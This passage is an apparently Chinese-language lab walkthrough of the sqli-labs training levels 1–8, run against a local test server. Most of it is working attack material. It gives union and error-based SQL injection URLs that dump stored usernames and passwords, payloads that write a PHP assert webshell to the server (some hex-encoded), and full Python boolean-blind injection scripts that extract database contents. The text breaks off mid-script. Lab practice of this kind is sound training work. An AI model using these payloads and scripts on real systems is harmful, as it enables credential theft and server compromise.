@@ -1,0 +1,733 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="htmledit_views" id="content_views">
+<p id="main-toc"><strong>目录</strong></p>
+<p id="%E9%A2%98%E5%A4%96%E8%AF%9D-toc" style="margin-left:0px;"><a href="#%E9%A2%98%E5%A4%96%E8%AF%9D">题外话</a></p>
+<p id="Less-1-toc" style="margin-left:0px;"><a href="#Less-1">Less-1</a></p>
+<p id="Less-2-toc" style="margin-left:0px;"><a href="#Less-2">Less-2</a></p>
+<p id="Less-3-toc" style="margin-left:0px;"><a href="#Less-3">Less-3</a></p>
+<p id="%C2%A0Less-4-toc" style="margin-left:0px;"><a href="#%C2%A0Less-4"> Less-4</a></p>
+<p id="Less-5-toc" style="margin-left:0px;"><a href="#Less-5">Less-5</a></p>
+<p id="Less-6-toc" style="margin-left:0px;"><a href="#Less-6">Less-6</a></p>
+<p id="Less-7-toc" style="margin-left:0px;"><a href="#Less-7">Less-7</a></p>
+<p id="Less-8-toc" style="margin-left:0px;"><a href="#Less-8">Less-8</a></p>
+<p id="Less-9-toc" style="margin-left:0px;"><a href="#Less-9">Less-9</a></p>
+<p id="Less-10-toc" style="margin-left:0px;"><a href="#Less-10">Less-10</a></p>
+<hr id="hr-toc"/>
+<p>这10关都是GET型的，包括了union注入、报错注入、布尔盲注和时间盲注，虽然包含了几种闭合方式，但是没有涉及到过滤和绕过，是最基础的关卡。</p>
+<h1 id="%E9%A2%98%E5%A4%96%E8%AF%9D">题外话</h1>
+<p>1、我刚发现，原来每关源代码同目录的result.txt中都会记录每次输入的payload</p>
+<p><img alt="" height="135" src="image\20210815170300484.png" width="567"/></p>
+<p><img alt="" height="265" src="image\20210815205716668.png" width="581"/></p>
+<p>2、闯关的时候发现一个神奇的情况，如果字段本身是<span style="color:#ed7976;">int</span>类型，并且在查询语句中该字段的值被双引号或者单引号包裹，则只要值是以正确数字开头的，后面接多余的字符还是可以返回正确的查询结果，甚至单引号中可以包含双引号，双引号中可以包含单引号。如下图所示：</p>
+<p><img alt="" height="251" src="https://img-blog.csdnimg.cn/20210815210439313.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2VsZXBoYW50eGlhbmc=,size_16,color_FFFFFF,t_70" width="541"/></p>
+<p></p>
+<h1 id="Less-1">Less-1</h1>
+<p>首先输入正确的url：<a href="http://192.168.101.16/sqli-labs-master/Less-1/?id=1">http://192.168.101.16/sqli-labs-master/Less-1/?id=1</a></p>
+<p>能够知道本关的查询结果是会回显的</p>
+<p><img alt="" height="400" src="image\20210815211505841.png" width="1200"/></p>
+<p>然后输入<a href="http://192.168.101.16/sqli-labs-master/Less-1/?id=1">http://192.168.101.16/sqli-labs-master/Less-1/?id=1</a>'</p>
+<p>可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关是闭合单引号</p>
+<p><img alt="" height="356" src="image\20210815211302959.png" width="1200"/></p>
+<p>这关使用union注入，后续爆库和写webshell的payload如下：</p>
+<pre><code>#下面两步找列数
+http://192.168.101.16/sqli-labs-master/Less-1/?id=1' order by 3-- s
+http://192.168.101.16/sqli-labs-master/Less-1/?id=1' order by 4-- s
+#确定哪个字段有回显
+http://192.168.101.16/sqli-labs-master/Less-1/?id=-1' union select 1,2,3-- s
+#确定当前数据库
+http://192.168.101.16/sqli-labs-master/Less-1/?id=-1' union select 1,2,database()-- s
+#爆出当前数据库内的所有表名
+http://192.168.101.16/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- s
+#爆出当前数据库user表的所有列名
+http://192.168.101.16/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()-- s
+#爆出当前数据库user表所有username和password
+http://192.168.101.16/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users-- s
+#下面这步写webshell
+http://192.168.101.16/sqli-labs-master/Less-1/?id=-1' union select 1,2,'&lt;?php assert($_POST[less1]);?&gt;' into outfile 'C:/less1.php'-- s</code></pre>
+<p>爆库结果：<img alt="" height="381" src="image\20210815212452694.png" width="1200"/></p>
+<p> 写入服务器的webshell：</p>
+<p><img alt="" height="75" src="image\20210815212606732.png" width="370"/></p>
+<p> 这关代码如下，没有对id进行过滤，29行可以看出闭合是单引号，36和38行看出查询结果有回显，另外44行是用于在sql语句有语法问题的时候返回错误的。</p>
+<p><img alt="" height="769" src="image\20210815211209341.png" width="629"/></p>
+<p></p>
+<h1 id="Less-2">Less-2</h1>
+<p>首先输入正确的url：<a href="http://192.168.101.16/sqli-labs-master/Less-2/?id=1">http://192.168.101.16/sqli-labs-master/Less-2/?id=1</a></p>
+<p>能够知道本关的查询结果是会回显的</p>
+<p><img alt="" height="357" src="image\20210815213301842.png" width="1200"/></p>
+<p> 然后输入<a href="http://192.168.101.16/sqli-labs-master/Less-2/?id=1%27">http://192.168.101.16/sqli-labs-master/Less-2/?id=1'</a></p>
+<p>可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关不用闭合</p>
+<p><img alt="" height="327" src="image\2021081521342660.png" width="1200"/></p>
+<p>这关使用union注入，后续爆库和写webshell的payload如下：</p>
+<pre><code>#下面两步找列数
+http://192.168.101.16/sqli-labs-master/Less-2/?id=1 order by 3-- s
+http://192.168.101.16/sqli-labs-master/Less-2/?id=1 order by 4-- s
+#确定哪个字段有回显
+http://192.168.101.16/sqli-labs-master/Less-2/?id=-1 union select 1,2,3-- s
+#确定当前数据库
+http://192.168.101.16/sqli-labs-master/Less-2/?id=-1 union select 1,2,database()-- s
+#爆出当前数据库内的所有表名
+http://192.168.101.16/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- s
+#爆出当前数据库user表的所有列名
+http://192.168.101.16/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()-- s
+#爆出当前数据库user表所有username和password
+http://192.168.101.16/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users-- s
+#下面这步写webshell
+http://192.168.101.16/sqli-labs-master/Less-2/?id=-1 union select 1,2,'&lt;?php assert($_POST[less2]);?&gt;' into outfile 'C:/less2.php'-- s</code></pre>
+<p> 爆库结果：</p>
+<p><img alt="" height="382" src="image\20210815213812377.png" width="1200"/></p>
+<p> 写入服务器的webshell：</p>
+<p><img alt="" height="70" src="image\20210815213848509.png" width="391"/></p>
+<p> 本关代码如下，可以看出除了32行的sql语句中$id没有用引号闭合之外，其他和Less-1都是相同的。</p>
+<p> <img alt="" height="693" src="image\20210815213208448.png" width="614"/></p>
+<p></p>
+<h1 id="Less-3">Less-3</h1>
+<p>首先输入正确的url：<a href="http://192.168.101.16/sqli-labs-master/Less-3/?id=1">http://192.168.101.16/sqli-labs-master/Less-3/?id=1</a></p>
+<p>能够知道本关的查询结果是会回显的</p>
+<p><img alt="" height="368" src="image\20210815214216161.png" width="1200"/></p>
+<p> 然后输入<a href="http://192.168.101.16/sqli-labs-master/Less-3/?id=1%27">http://192.168.101.16/sqli-labs-master/Less-3/?id=1'</a></p>
+<p>可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关闭合是')</p>
+<p><img alt="" height="346" src="image\20210815214304491.png" width="1200"/></p>
+<p> 这关使用union注入，后续爆库和写webshell的payload如下：</p>
+<pre><code>#下面两步找列数
+http://192.168.101.16/sqli-labs-master/Less-3/?id=:1') order by 3-- s
+http://192.168.101.16/sqli-labs-master/Less-3/?id=:1') order by 4-- s
+#确定哪个字段有回显
+http://192.168.101.16/sqli-labs-master/Less-3/?id=:-1') union select 1,2,3-- s
+#确定当前数据库
+http://192.168.101.16/sqli-labs-master/Less-3/?id=:-1') union select 1,2,database()-- s
+#爆出当前数据库内的所有表名
+http://192.168.101.16/sqli-labs-master/Less-3/?id=:-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- s
+#爆出当前数据库user表的所有列名
+http://192.168.101.16/sqli-labs-master/Less-3/?id=:-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()-- s
+#爆出当前数据库user表所有username和password
+http://192.168.101.16/sqli-labs-master/Less-3/?id=:-1') union select 1,group_concat(username),group_concat(password) from users-- s
+#下面这步写webshell
+http://192.168.101.16/sqli-labs-master/Less-3/?id=:-1') union select 1,2,'&lt;?php assert($_POST[less3]);?&gt;' into outfile 'C:/less3.php'-- s</code></pre>
+<p> 爆库结果：</p>
+<p><img alt="" height="373" src="image\20210815215615375.png" width="1200"/></p>
+<p> 写入服务器的webshell：</p>
+<p> <img alt="" height="73" src="image\20210815215655568.png" width="420"/></p>
+<p>  本关代码如下，可以看出除了31行的sql语句中的闭合之外，其他和Less-1都是相同的。</p>
+<p><img alt="" height="768" src="image\20210815214148847.png" width="723"/></p>
+<p></p>
+<h1 id="%C2%A0Less-4"> Less-4</h1>
+<p>首先输入正确的url：<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1">http://192.168.101.16/sqli-labs-master/Less-4/?id=1</a></p>
+<p>能够知道本关的查询结果是会回显的</p>
+<p><img alt="" height="385" src="image\20210815215848581.png" width="1200"/></p>
+<p>  然后输入<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1%22">http://192.168.101.16/sqli-labs-master/Less-4/?id=1"</a></p>
+<p></p>
+<p>可以发现这关如果输入不符合sql语法是会在页面上返回报错信息的，根据这个就可以明确知道需要闭合什么符号，比如这关闭合是")</p>
+<p><span style="color:#ed7976;">(注意这关输入id=1'是不会报错的，原因就是题外话的第2条)</span></p>
+<p><img alt="" height="334" src="image\20210815215923307.png" width="1200"/></p>
+<p>  这关使用union注入，后续爆库和写webshell的payload如下：</p>
+<pre><code>#下面两步找列数
+http://192.168.101.16/sqli-labs-master/Less-4/?id=1") order by 3-- s
+http://192.168.101.16/sqli-labs-master/Less-4/?id=1") order by 4-- s
+#确定哪个字段有回显
+http://192.168.101.16/sqli-labs-master/Less-4/?id=-1") union select 1,2,3-- s
+#确定当前数据库
+http://192.168.101.16/sqli-labs-master/Less-4/?id=-1") union select 1,2,database()-- s
+#爆出当前数据库内的所有表名
+http://192.168.101.16/sqli-labs-master/Less-4/?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- s
+#爆出当前数据库user表的所有列名
+http://192.168.101.16/sqli-labs-master/Less-4/?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()-- s
+#爆出当前数据库user表所有username和password
+http://192.168.101.16/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(username),group_concat(password) from users-- s
+#下面这步写webshell
+http://192.168.101.16/sqli-labs-master/Less-4/?id=-1") union select 1,2,'&lt;?php assert($_POST[less4]);?&gt;' into outfile 'C:/less4.php'-- s
+</code></pre>
+<p> 爆库结果：</p>
+<p><img alt="" height="382" src="image\20210815220444377.png" width="1200"/></p>
+<p> 写入服务器的webshell：</p>
+<p> <img alt="" height="80" src="image\20210815220527207.png" width="385"/></p>
+<p>  本关代码如下，从28，29行可以看出，本关除了sql语句中的闭合之外，其他和Less-1都是相同的。</p>
+<p><img alt="" height="787" src="image\20210815220618669.png" width="642"/></p>
+<p></p>
+<h1 id="Less-5">Less-5</h1>
+<p>首先输入正确的url：<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1">http://192.168.101.16/sqli-labs-master/Less-5/?id=1</a></p>
+<p>能够知道本关的查询结果不回显</p>
+<p></p>
+<p><img alt="" height="340" src="image\20210815222106141.png" width="1200"/></p>
+<p> 然后输入<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1%22">http://192.168.101.16/sqli-labs-master/Less-5/?id=1'</a></p>
+<p> 发现语法报错还是存在的，并且从报错可以判断出本关的闭合是单引号<img alt="" height="347" src="image\20210815222208883.png" width="1200"/></p>
+<p>   这关使用报错注入，后续爆库和写webshell的payload如下：</p>
+<pre><code>#获取当前数据库名称
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- s
+#获取当前数据库所有表名称
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)-- s
+#获取当前数据库user表所有列名称
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)-- s
+#获取当前数据库user表所有username和password的值
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1'and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)-- s
+#下面这步写webshell
+http://192.168.101.16/sqli-labs-master/Less-5/?id=1' into outfile 'C:/less5.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e-- s
+
+</code></pre>
+<p>爆库结果分好几段，这边就展示第一段</p>
+<p><img alt="" height="354" src="image\20210815222658241.png" width="1200"/></p>
+<p>  写入服务器的webshell：</p>
+<p><img alt="" height="63" src="image\20210815222740745.png" width="441"/></p>
+<p>下面是本关代码，和Less-1的显著不同是33-39行，查询结果不回显</p>
+<p><img alt="" height="765" src="image\20210815222900361.png" width="647"/></p>
+<p></p>
+<h1 id="Less-6">Less-6</h1>
+<p>首先输入正确的url：<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1">http://192.168.101.16/sqli-labs-master/Less-6/?id=1</a></p>
+<p>能够知道本关的查询结果不回显</p>
+<p><img alt="" height="334" src="image\20210815223227251.png" width="1200"/></p>
+<p>再输入：<a href="http://192.168.101.16/sqli-labs-master/Less-6/?id=1%22">http://192.168.101.16/sqli-labs-master/Less-6/?id=1</a>"</p>
+<p>发现语法报错还是存在的，并且从报错可以判断出本关的闭合是双引号</p>
+<p><img alt="" height="333" src="image\20210815223319225.png" width="1200"/></p>
+<p> 这关使用报错注入，后续爆库和写webshell的payload如下：</p>
+<pre><code>#获取当前数据库名称
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- s
+#获取当前数据库所有表名称
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)-- s
+#获取当前数据库user表所有列名称
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),1,31),0x7e),1)-- s
+#获取当前数据库user表所有username和password的值
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),1,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),32,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),63,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),94,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),125,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),156,31),0x7e),1)-- s
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,'^',password)) from users),187,31),0x7e),1)-- s
+#下面这步写webshell
+http://192.168.101.16/sqli-labs-master/Less-6/?id=1" into outfile 'C:/less6.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373365d293b3f3e-- s
+
+</code></pre>
+<p>爆库结果分好几段，这边就展示第一段</p>
+<p><img alt="" height="347" src="image\20210815225748737.png" width="1200"/></p>
+<p>写入服务器的webshell</p>
+<p><img alt="" height="70" src="image\20210815225826439.png" width="445"/></p>
+<p> 下面是本关代码，和Less-5的区别仅在于sql语句的参数值闭合符号不同（28，29行）</p>
+<p><img alt="" height="691" src="image\20210815225939351.png" width="647"/></p>
+<p></p>
+<h1 id="Less-7">Less-7</h1>
+<p>首先输入正确的url：<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1">http://192.168.101.16/sqli-labs-master/Less-7/?id=1</a></p>
+<p>能够知道本关的查询结果不回显</p>
+<p><img alt="" height="351" src="image\202108162015263.png" width="1200"/></p>
+<p> 再输入：<a href="http://192.168.101.16/sqli-labs-master/Less-7/?id=1%27">http://192.168.101.16/sqli-labs-master/Less-7/?id=1</a>'</p>
+<p>发现本关不会显示具体的sql语法问题</p>
+<p><img alt="" height="326" src="image\20210816201616525.png" width="1200"/></p>
+<p>再输入：<a href="http://192.168.101.16/sqli-labs-master/Less-7/?id=-1">http://192.168.101.16/sqli-labs-master/Less-7/?id=-1</a></p>
+<p>发现页面回显和上图是一样的。所以本关sql语句有语法错误或者参数值在表中查询不到返回的页面是相同的，并且与参数值正确且无语法错误时不同。这关可以用bool盲注。</p>
+<p>如果手工注入的话，闭合可以用burpsuite爆破，这里就不写了。找到闭合之后，就可以开始爆库和写webshell了。</p>
+<p>关于爆库，这关我改了一下之前写的脚本（<a href="https://github.com/JacquelinXiang/sqli_bool">JacquelinXiang/sqli_bool: A simple tool/framework for boolean-based sql injection(GET/POST/COOKIE) (github.com)</a>），修改后的代码如下：</p>
+<pre><code class="language-python">#!/usr/bin/python3
+# coding=utf-8
+
+"""
+:copyright: Copyright (c) 2021, Fancy Xiang. All rights reserved.
+:license: GNU General Public License v3.0, see LICENSE for more details.
+"""
+
+import requests
+
+url = "http://192.168.101.16/sqli-labs-master/Less-7/"               #有可利用漏洞的url，根据实际情况填写
+headers={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",}    #http request报文头部，根据实际情况填写
+ 
+keylist = [chr(i) for i in range(33, 127)]                                     #包括数字、大小写字母、可见特殊字符
+flag = 'You are in'                                        #用于判断附加sql语句为真的字符，根据网页回显填写
+
+def CurrentDatabase7():
+    n = 10                                                                      #预测当前数据库名称最大可能的长度，根据实际情况填写
+    k = 0
+    j = n//2 
+    length = 0
+    db = str()
+    while True:
+        if j&gt;k and j&lt;n and j-k&gt;3:
+            payload1 = "1')) and length(database())&gt;"+str(j)+"-- ss"           #所有payload根据实际情况填写
+            param = {
+            "id":payload1,
+            }
+            response = requests.get(url, params = param, headers = headers)     #GET方法发送含payload的request
+            #print(response.request.headers)
+            #print(response.text)
+            if response.text.find(flag) != -1:
+                n=n
+                k=j
+            else:
+                k=k
+                n=j
+            j=(n-k)//2
+        elif j-k==3 or j-k&lt;3:
+            for i in range(k-1,n+2):
+                payload2 = "1')) and length(database())="+str(i)+"-- ss"
+                param = {
+                "id":payload2,
+                }
+                response = requests.get(url, params = param, headers = headers)
+                if response.text.find(flag) != -1:
+                    length = i
+                    break
+            break
+        else:
+            break
+    print("the name of current database contains "+str(length)+" characters")
+    
+    for i in range(1,length+1):
+        for c in keylist:
+            payload3 = "1')) and substring(database(),"+str(i)+",1)='"+c+"'-- ss"
+            param = {
+            "id":payload3,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                db = db+c
+                break
+    print("the name of current database is "+str(db))
+    
+def Tables7():
+    n = 100                                                                     #预测当前数据库中所有表名称最大可能的长度，根据实际情况填写
+    k = 0
+    j = n//2
+    length = 0
+    tname = str()
+    while True:
+        if j&gt;k and j&lt;n and j-k&gt;3:
+            payload4 = "1')) and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))&gt;"+str(j)+"-- ss"
+            param = {
+            "id":payload4,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                n=n
+                k=j
+            else:
+                k=k
+                n=j
+            j=(n-k)//2
+        elif j-k==3 or j-k&lt;3:
+            for i in range(k-1,n+2):
+                payload5 = "1')) and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))="+str(i)+"-- ss"
+                param = {
+                "id":payload5,
+                }
+                response = requests.get(url, params = param, headers = headers)
+                if response.text.find(flag) != -1:
+                    length = i
+                    break
+            break
+        else:
+            break
+    print("the name of all tables in current database contains "+str(length)+" characters")
+    
+    for i in range(1,length+1):
+        for c in keylist:
+            payload6 = "1')) and substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),"+str(i)+",1)='"+c+"'-- ss"
+            param = {
+            "id":payload6,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                tname = tname+c
+                break
+    print("the name of all tables in current database is "+str(tname))
+
+
+def Columns7(table):                                                          #table参数是需要爆破的数据表名称，记得加单引号
+    n = 200                                                                     #预测某个表所有列名称最大可能的长度，根据实际情况填写
+    k = 0
+    j = n//2
+    length = 0
+    cname = str()
+    while True:
+        if j&gt;k and j&lt;n and j-k&gt;3:
+            payload7 = "1')) and (length((select group_concat(column_name) from information_schema.columns where table_name = '"+table+"' and table_schema = database())))&gt;"+str(j)+"-- ss"
+            param = {
+            "id":payload7,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                n=n
+                k=j
+            else:
+                k=k
+                n=j
+            j=(n-k)//2
+        elif j-k==3 or j-k&lt;3:
+            for i in range(k-1,n+2):
+                payload8 = "1')) and (length((select group_concat(column_name) from information_schema.columns where table_name = '"+table+"' and table_schema = database())))="+str(i)+"-- ss"
+                param = {
+                "id":payload8,
+                }
+                response = requests.get(url, params = param, headers = headers)
+                if response.text.find(flag) != -1:
+                    length = i
+                    break
+            break
+        else:
+            break
+    print("the name of all columns in current table contains "+str(length)+" characters")
+    
+    for i in range(1,length+1):
+        for c in keylist:
+            payload9 = "1')) and substr((select group_concat(column_name) from information_schema.columns where table_name = '"+table+"' and table_schema = database()),"+str(i)+",1)='"+c+"'-- ss"
+            param = {
+            "id":payload9,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                cname = cname+c
+                break
+    print("the name of all columns in current table is "+str(cname))
+
+def Content7(table,col1,col2):                                                #table参数是需要爆破的数据表名称，col1和col2是需要爆破内容的列，记得都要加单引号
+    n = 200                                                                     #预测期望获取的数据的最大可能的长度，根据实际情况填写
+    k = 0
+    j = n//2
+    length = 0
+    content = str()
+    while True:
+        if j&gt;k and j&lt;n and j-k&gt;3:
+            payload10 = "1')) and (length((select group_concat(concat("+col1+",'^',"+col2+")) from "+table+")))&gt;"+str(j)+"-- ss"
+            param = {
+            "id":payload10,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                n=n
+                k=j
+            else:
+                k=k
+                n=j
+            j=(n-k)//2
+        elif j-k==3 or j-k&lt;3:
+            for i in range(k-1,n+2):
+                payload11 = "1')) and (length((select group_concat(concat("+col1+",'^',"+col2+")) from "+table+")))="+str(i)+"-- ss"
+                param = {
+                "id":payload11,
+                }
+                response = requests.get(url, params = param, headers = headers)
+                if response.text.find(flag) != -1:
+                    length = i
+                    break
+            break
+        else:
+            break
+    print("the content contains "+str(length)+" characters")
+    
+    for i in range(1,length+1):
+        for c in keylist:
+            payload12 = "1')) and substr((select group_concat(concat("+col1+",'^',"+col2+")) from "+table+"),"+str(i)+",1)='"+c+"'-- ss"
+            param = {
+            "id":payload12,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                content = content+c
+                break
+    print("the content is "+str(content))</code></pre>
+<p> 测试结果如下：</p>
+<p><img alt="" height="240" src="https://img-blog.csdnimg.cn/20210816203023949.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2VsZXBoYW50eGlhbmc=,size_16,color_FFFFFF,t_70" width="961"/></p>
+<p> 写入webshell使用如下payload：</p>
+<pre><code>http://192.168.101.16/sqli-labs-master/Less-7/?id=1')) into outfile 'C:/less7.php' lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373375d293b3f3e-- s</code></pre>
+<p>0x后面是&lt;?php assert($_POST[less7]);?&gt;的十六进制编码。服务器上写入的webshell如下：</p>
+<p><img alt="" height="62" src="image\20210816203702230.png" width="440"/></p>
+<p> 本关代码如下，从45，46行可见，当查询不到正确结果的时候，输出提示You have an error in your SQL syntax，而不返回报错。</p>
+<p><img alt="" height="757" src="image\20210816204011490.png" width="622"/></p>
+<p></p>
+<h1 id="Less-8">Less-8</h1>
+<p>首先输入正确的url：<a href="http://192.168.101.16/sqli-labs-master/Less-4/?id=1">http://192.168.101.16/sqli-labs-master/Less-8/?id=1</a></p>
+<p>能够知道本关的查询结果不回显</p>
+<p><img alt="" height="372" src="image\20210816204235976.png" width="1200"/></p>
+<p> 再输入：<a href="http://192.168.101.16/sqli-labs-master/Less-7/?id=1%27">http://192.168.101.16/sqli-labs-master/Less-8/?id=1</a>'</p>
+<p>发现除了固定页面显示之外，没有任何回显</p>
+<p><img alt="" height="356" src="image\20210816204356986.png" width="1200"/> 再输入：<a href="http://192.168.101.16/sqli-labs-master/Less-7/?id=-1">http://192.168.101.16/sqli-labs-master/Less-8/?id=-1</a></p>
+<p></p>
+<p>效果和上图一样。这关可以用bool盲注。</p>
+<p>同样，这关我们手工注入找闭合可以用burpsuite爆破。</p>
+<p> 接下来的爆库，我在上一关代码的基础上做了修改，修改后的代码如下：</p>
+<pre><code class="language-python">#!/usr/bin/python3
+# coding=utf-8
+
+"""
+functions for boolean-based sql injection(GET)
+
+:copyright: Copyright (c) 2021, Fancy Xiang. All rights reserved.
+:license: GNU General Public License v3.0, see LICENSE for more details.
+"""
+
+import requests
+
+url = "http://192.168.101.16/sqli-labs-master/Less-8/"               #有可利用漏洞的url，根据实际情况填写
+headers={ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",}    #http request报文头部，根据实际情况填写
+ 
+keylist = [chr(i) for i in range(33, 127)]                                     #包括数字、大小写字母、可见特殊字符
+flag = 'You are in'                                        #用于判断附加sql语句为真的字符，根据网页回显填写
+
+def CurrentDatabaseGET():
+    n = 10                                                                      #预测当前数据库名称最大可能的长度，根据实际情况填写
+    k = 0
+    j = n//2 
+    length = 0
+    db = str()
+    while True:
+        if j&gt;k and j&lt;n and j-k&gt;3:
+            payload1 = "1' and length(database())&gt;"+str(j)+"-- ss"           #所有payload根据实际情况填写
+            param = {
+            "id":payload1,
+            }
+            response = requests.get(url, params = param, headers = headers)     #GET方法发送含payload的request
+            #print(response.request.headers)
+            #print(response.text)
+            if response.text.find(flag) != -1:
+                n=n
+                k=j
+            else:
+                k=k
+                n=j
+            j=(n-k)//2
+        elif j-k==3 or j-k&lt;3:
+            for i in range(k-1,n+2):
+                payload2 = "1' and length(database())="+str(i)+"-- ss"
+                param = {
+                "id":payload2,
+                }
+                response = requests.get(url, params = param, headers = headers)
+                if response.text.find(flag) != -1:
+                    length = i
+                    break
+            break
+        else:
+            break
+    print("the name of current database contains "+str(length)+" characters")
+    
+    for i in range(1,length+1):
+        for c in keylist:
+            payload3 = "1' and substring(database(),"+str(i)+",1)='"+c+"'-- ss"
+            param = {
+            "id":payload3,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                db = db+c
+                break
+    print("the name of current database is "+str(db))
+    
+def TablesGET():
+    n = 100                                                                     #预测当前数据库中所有表名称最大可能的长度，根据实际情况填写
+    k = 0
+    j = n//2
+    length = 0
+    tname = str()
+    while True:
+        if j&gt;k and j&lt;n and j-k&gt;3:
+            payload4 = "1' and (length((select group_concat(table_name) from information_schema.tables where table_schema = database())))&gt;"+str(j)+"-- ss"
+            param = {
+            "id":payload4,
+            }
+            response = requests.get(url, params = param, headers = headers)
+            if response.text.find(flag) != -1:
+                n=n
+                k=j
+            else:
+                k=k
+                n=j
+            j=(n-k)//2
+        elif j-k==3 or j-k&lt;3:
+            for i in range(k-1,n+2):
